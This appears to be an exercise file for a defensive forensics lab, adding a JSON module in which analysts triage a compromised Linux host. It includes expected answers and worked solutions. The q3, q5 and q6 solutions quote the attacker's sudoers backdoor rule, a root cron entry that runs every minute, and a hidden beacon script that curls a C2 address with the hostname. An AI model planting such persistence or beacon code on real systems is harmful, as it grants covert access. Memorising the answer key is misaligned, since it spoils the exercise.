@@ -1,0 +1,57 @@
+{
+  "id": "03-triage",
+  "title": "Compromised host triage",
+  "shortTitle": "03 — Compromised host triage",
+  "workdir": "/home/isopod/",
+  "intro": "An anomalous outbound connection was detected from `10.78.8.50` (`forensics-box`). SSH in as `analyst` and triage the host for signs of compromise.\n\n```bash\nssh analyst@10.78.8.50\n# password: analyst\n```\n\nWork through the standard triage checklist: users, privileges, scheduled tasks, persistence mechanisms, and attacker artefacts.",
+  "questions": [
+    {
+      "id": "q1",
+      "prompt": "Start with users. List all accounts on the host that have a real login shell (not `/usr/sbin/nologin` or `/bin/false`). Which account should not be present on a freshly deployed server? (It is not `analyst` or `root`.)",
+      "expectedOutput": "sys0p",
+      "solutionMarkdown": "```bash\ngrep -v 'nologin\\|false' /etc/passwd | cut -d: -f1\n# root\n# analyst\n# sys0p\n```\n\n`sys0p` is the unexpected account. On a minimal server you would expect only `root` and the service account used for remote access. An attacker commonly adds a backdoor user as a persistence mechanism — it survives service restarts and is invisible to monitoring that only watches for process-based IOCs.\n\nThe name `sys0p` is designed to look like a legitimate system account at a glance."
+    },
+    {
+      "id": "q2",
+      "prompt": "What UID was assigned to the `sys0p` account?",
+      "expectedOutput": "1337",
+      "solutionMarkdown": "```bash\ngrep sys0p /etc/passwd\n# sys0p:x:1337:1337::/home/sys0p:/bin/bash\n\ngrep sys0p /etc/passwd | cut -d: -f3\n# 1337\n```\n\nUID `1337` is a non-standard choice — the attacker deliberately picked a memorable value rather than the next sequential UID, which would have been `1001` on this system. Anomalous UIDs (very high or culturally significant values) are a quick triage signal.\n\nUID 0 is the only value that grants unconditional root access at the kernel level, so `1337` is not inherently privileged — but the next question reveals how the attacker elevated from there."
+    },
+    {
+      "id": "q3",
+      "prompt": "Check the sudoers drop-in files. What sudo rule was planted for `sys0p`?",
+      "expectedOutput": "sys0p ALL=(ALL) NOPASSWD: /bin/bash",
+      "solutionMarkdown": "```bash\nls /etc/sudoers.d/\n# sys0p\n\ncat /etc/sudoers.d/sys0p\n# sys0p ALL=(ALL) NOPASSWD: /bin/bash\n```\n\nThis rule grants `sys0p` the ability to run `/bin/bash` as any user, on any host, with no password prompt — effectively unconditional root access via `sudo bash`.\n\nDropping a file into `/etc/sudoers.d/` rather than editing `/etc/sudoers` directly is stealthier: it does not appear in a simple `diff` of `/etc/sudoers`, and the file name (`sys0p`) blends in with legitimate drop-ins."
+    },
+    {
+      "id": "q4",
+      "prompt": "Check the cron drop-ins for scheduled tasks added by the attacker. What is the name of the malicious file in `/etc/cron.d/`?",
+      "expectedOutput": "update-check",
+      "solutionMarkdown": "```bash\nls /etc/cron.d/\n# update-check\n```\n\nThe filename `update-check` is deliberately generic — it mimics the naming style of legitimate system maintenance cron jobs. Attackers rely on responders skipping files with plausible-sounding names.\n\nLegitimate cron drop-ins in Debian typically come from installed packages (e.g., `anacron`, `apt`). Any file in `/etc/cron.d/` that was not created by a known package is suspicious."
+    },
+    {
+      "id": "q5",
+      "prompt": "Read the malicious cron file. What is the full cron entry — the line that defines the schedule and command?",
+      "expectedOutput": "* * * * * root /usr/local/bin/.update-service",
+      "solutionMarkdown": "```bash\ncat /etc/cron.d/update-check\n# * * * * * root /usr/local/bin/.update-service\n```\n\nThe schedule `* * * * *` means **every minute** — an aggressive beacon interval that maximises the chance of a C2 connection re-establishing quickly after network interruptions.\n\nThe job runs as `root`, which means the script inherits full system privileges. The script path `/usr/local/bin/.update-service` uses a hidden filename (leading dot) to avoid appearing in a casual `ls /usr/local/bin/`."
+    },
+    {
+      "id": "q6",
+      "prompt": "Examine the backdoor script referenced in the cron entry. What IP address does it connect to?",
+      "expectedOutput": "10.78.8.250",
+      "solutionMarkdown": "```bash\ncat /usr/local/bin/.update-service\n# #!/bin/bash\n# # system health check\n# curl -sf \"http://10.78.8.250/c2/beacon?host=$(hostname)\" > /dev/null 2>&1\n\ngrep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' /usr/local/bin/.update-service\n# 10.78.8.250\n```\n\nThe same C2 IP (`10.78.8.250`) appears in `payload.bin` (topic 01) and `dropper.b64` (topic 01) — this confirms all three artifacts belong to the same campaign. The script suppresses all output with `-s` and `> /dev/null 2>&1` to avoid leaving traces in shell history or system logs."
+    },
+    {
+      "id": "q7",
+      "prompt": "List all files in `/usr/local/bin/` including hidden ones. What is the name of the hidden backdoor script?",
+      "expectedOutput": ".update-service",
+      "solutionMarkdown": "```bash\nls -la /usr/local/bin/\n# total 12\n# drwxr-xr-x 2 root root 4096 Mar 15 05:33 .\n# drwxr-xr-x 9 root root 4096 Jan 27 06:28 ..\n# -rwxr-xr-x 1 root root   97 Mar 15 05:33 .update-service\n```\n\nFiles starting with `.` are hidden from `ls` without the `-a` flag. This is a common but elementary concealment technique — it defeats casual inspection but is immediately obvious with `ls -la` or `find`.\n\n```bash\n# Alternative discovery approaches\nfind /usr/local/bin -name '.*'        # hidden files only\nfind / -newer /etc/passwd -name '.*'  # hidden files modified after passwd\n```"
+    },
+    {
+      "id": "q8",
+      "prompt": "The attacker left a flag file in `/var/tmp/`. Find it and read it.",
+      "expectedOutput": "FLAG=shell-crab-0x03",
+      "solutionMarkdown": "```bash\nls -la /var/tmp/\n# -rw-r--r-- 1 root root 21 Mar 15 05:33 .loot\n\ncat /var/tmp/.loot\n# FLAG=shell-crab-0x03\n```\n\nThe attacker dropped an artefact in `/var/tmp/` — a sticky directory that survives reboots (unlike `/tmp/`). Hidden files in world-writable temporary directories are a common staging location for downloaded payloads, exfiltrated data, and operational markers.\n\nThis completes the triage chain:\n1. **Backdoor user** `sys0p` (uid 1337) for persistent access\n2. **Sudo escalation** via `/etc/sudoers.d/sys0p`\n3. **Cron persistence** running the beacon every minute\n4. **Beacon script** calling back to `10.78.8.250`\n5. **Loot drop** confirming the host was fully owned\n\nNext steps in a real investigation: capture a memory image, preserve disk evidence, rotate all credentials, and review firewall logs for lateral movement to other hosts."
+    }
+  ]
+}
